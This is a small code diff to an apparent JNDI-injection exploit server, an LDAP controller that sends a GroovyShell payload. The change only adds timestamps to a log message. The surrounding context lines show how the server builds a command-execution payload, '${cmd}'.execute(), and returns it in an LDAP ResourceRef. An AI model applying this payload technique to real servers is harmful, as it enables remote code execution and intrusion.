@@ -9,6 +9,7 @@ import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
+import java.sql.Timestamp;
 
 import static artsploit.Utilities.getBase64CommandTpl;
 import static artsploit.Utilities.serialize;
@@ -32,8 +33,8 @@ public class Groovy implements LdapController {
     String payload = "'${cmd}'.execute()".replace("${cmd}", getBase64CommandTpl(Config.command));
 
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-
-        System.out.println("Sending LDAP ResourceRef result for " + base + " with groovy.lang.GroovyShell payload");
+        Timestamp timestamp = new Timestamp(System.currentTimeMillis());
+        System.out.println(timestamp + "Sending LDAP ResourceRef result for " + base + " with groovy.lang.GroovyShell payload");
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
